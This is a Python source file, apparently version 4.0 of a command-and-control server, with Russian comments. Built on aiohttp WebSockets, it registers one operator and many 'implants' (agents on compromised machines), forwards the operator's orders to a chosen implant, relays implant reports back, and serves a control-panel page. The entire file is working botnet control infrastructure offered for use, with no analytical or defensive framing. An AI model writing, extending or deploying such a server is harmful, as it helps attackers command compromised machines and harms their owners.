# --- ФАЙЛ: c2_server.py (Финальный, "тупой" почтальон) ---
import asyncio, json, os
from aiohttp import web

IMPLANTS, OPERATOR = {}, None

async def broadcast_bot_list():
  if OPERATOR and not OPERATOR.closed:
    await OPERATOR.send_json({'type': 'bot_list', 'data': [{'id': bot_id} for bot_id in IMPLANTS.keys()]})

async def websocket_handler(request):
    global OPERATOR, IMPLANTS
    ws = web.WebSocketResponse(heartbeat=25.0)
    await ws.prepare(request)
    client_type, client_id = None, None

    try:
        # Имплант должен представиться в течение 30 секунд
        initial_msg = await ws.receive_json(timeout=30.0)
        client_type = initial_msg.get('type')

        if client_type == 'operator':
            OPERATOR = ws
            print("[+] Оператор подключился.")
            await broadcast_bot_list()
        elif client_type == 'implant' and 'id' in initial_msg:
            client_id = initial_msg.get('id')
            IMPLANTS[client_id] = ws
            print(f"[+] Имплант на связи: {client_id}")
            await broadcast_bot_list()
        else: # Неизвестный тип или имплант без ID
            await ws.close()
            return ws

        async for msg in ws:
            if msg.type != web.WSMsgType.TEXT or msg.data == 'pong':
                continue

            try: data = json.loads(msg.data)
            except: continue

            # --- ЛОГИКА "ТУПОГО ПОЧТАЛЬОНА" ---
            if client_type == 'operator':
                target_id = data.get('target_id')
                if target_id in IMPLANTS and not IMPLANTS[target_id].closed:
                    # Просто пересылаем приказ импланту
                    await IMPLANTS[target_id].send_json(data)

            elif client_type == 'implant':
                if OPERATOR and not OPERATOR.closed:
                    # Просто пересылаем отчет от импланта оператору
                    data['bot_id'] = client_id
                    await OPERATOR.send_json(data)

    except Exception as e:
        print(f"[!] Ошибка в сессии '{client_id or 'Оператор'}': {e}")
    finally:
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]
            print(f"[-] Имплант отключился: {client_id}")
            await broadcast_bot_list()
        elif client_type == 'operator':
            OPERATOR = None
            print("[-] Оператор отключился.")
    return ws

async def http_handler(request):
    return web.FileResponse(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'index.html'))

app = web.Application()
app.router.add_get('/', http_handler)
app.router.add_get('/ws', websocket_handler)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    print(f"====== C2 SERVER (V4.0 - Почтальон) ONLINE на порту {port} ======")
    web.run_app(app, host='0.0.0.0', port=port)
